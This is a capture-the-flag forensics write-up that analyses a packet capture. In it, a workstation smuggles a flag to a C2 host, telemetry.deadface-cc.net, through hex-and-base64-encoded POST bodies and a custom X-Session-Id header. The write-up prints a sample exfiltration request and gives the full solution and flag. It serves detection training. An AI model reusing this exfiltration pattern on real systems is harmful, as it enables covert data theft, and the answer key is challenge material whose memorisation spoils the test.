# PCAP03 — Sneaky HTTP Exfiltration — Writeup

**Category:** Network Forensics / PCAP Analysis
**Flag:** `deadface{http_exfil_sneaky_business}`
**Artifact:** `PCAP03.pcap` (63 KB, 348 frames, HTTP over TCP)

## Summary

A workstation (`10.20.30.40`) browses a stream of harmless-looking websites —
BBC, NYT, Reddit, YouTube, GitHub, weather APIs — with equally boring POSTs
(`comment=nice+post`, `q=weather+today`, `user=bob&remember=1`). Buried in the
noise are five chunked POSTs to `telemetry.deadface-cc.net` that carry a flag
split across a hex→base64 encoding chain, with the final piece smuggled out in
a custom HTTP header instead of the body.

## Recon

Protocol hierarchy is nothing but TCP/HTTP. The IP conversation stats
immediately flag the outlier — every legitimate site gets short 2-frame
exchanges, while one host gets five separate POST sessions:

```
10.20.30.40  <->  45.66.77.88      5 frames in, 5 out, 1,826 bytes
```

```
$ tshark -r PCAP03.pcap -Y "http.request" -T fields -e http.host | sort | uniq -c
     21 fonts.googleapis.com          # decoys
     ...
      5 telemetry.deadface-cc.net     # <-- C2
```

## The exfil channel

Frames 111, 153, 185, 219, 259 — one POST per TCP stream, each with a
sequence number in the URI:

```
POST /api/upload?seq=1 HTTP/1.1
Host: telemetry.deadface-cc.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Session-Id: YnVzaW5lc3N9
Content-Type: application/octet-stream
Content-Length: 8

ZGVhZGZh
```

Two observations:

1. The request **bodies** are hex-encoded ASCII, and the decoded text is
   base64.
2. Every request repeats an odd `X-Session-Id` header — also base64. When the
   body fragments decode to a string that ends mid-flag, the header is where
   the rest went.

Reassembling by `seq` (follow each TCP stream, or just pull the bodies):

```bash
tshark -r PCAP03.pcap -Y "ip.addr==45.66.77.88 && http.request" \
       -T fields -e http.request.uri -e http.file_data
```

## Decoding

```python
import base64

chunks = ['5a4756685a475a68',   # seq=1 -> ZGVhZGZh
          '5932563761485230',   # seq=2 -> Y2V7aHR0
          '6346396c65475a70',   # seq=3 -> cF9leGZp
          '6246397a626d5668',   # seq=4 -> bF9zbmVh
          '61336c66']           # seq=5 -> a3lf

body = ''.join(bytes.fromhex(c).decode() for c in chunks)
# -> 'ZGVhZGZhY2V7aHR0cF9leGZpbF9zbmVha3lf'
print(base64.b64decode(body))
# -> b'deadface{http_exfil_sneaky_'          ... truncated

print(base64.b64decode('YnVzaW5lc3N9').decode())
# -> 'business}'                             ... the X-Session-Id header
```

Body fragments per chunk:

| seq | hex body | base64 | plaintext |
|-----|--------------------|----------|---------|
| 1 | `5a4756685a475a68` | `ZGVhZGZh` | `deadfa` |
| 2 | `5932563761485230` | `Y2V7aHR0` | `ce{htt` |
| 3 | `6346396c65475a70` | `cF9leGZp` | `p_exfi` |
| 4 | `6246397a626d5668` | `bF9zbmVh` | `l_snea` |
| 5 | `61336c66` | `a3lf` | `ky_` |

The closing `}` never appears in any body — it rides in the
`X-Session-Id: YnVzaW5lc3N9` header on **every** request
(`business}`). Stitch body + header:

```
deadface{http_exfil_sneaky_  +  business}
```

## Flag

```
deadface{http_exfil_sneaky_business}
```

## Lessons

- Outliers first: sort HTTP hosts by frequency / conversation bytes — the C2
  domain name (`telemetry.deadface-cc.net`) made that trivial here.
- "Session" headers are a classic side channel for small payload fragments
  when the body is already being inspected.
- Split-and-encode exfil (hex → base64 → plaintext, one `seq=` per chunk)
  defeats naive string searches in a single packet; always reassemble streams
  in order before decoding.
